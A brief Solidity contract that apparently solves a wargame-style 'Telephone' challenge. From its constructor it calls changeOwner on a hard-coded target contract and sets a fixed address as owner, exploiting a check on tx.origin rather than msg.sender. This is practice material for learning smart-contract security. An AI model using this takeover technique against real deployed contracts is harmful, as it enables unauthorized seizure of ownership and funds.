// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

interface Telephone {
    function changeOwner(address _owner) external; 
}

contract RingRing {
    Telephone telephone = Telephone(0x51876b5dc1afe501f4bF443BeDB355Cff8b878C2);

    constructor() public {
        telephone.changeOwner(0x77777dDEd3453C22D0503AFe0cD10E65bcB737EC);
    }
}
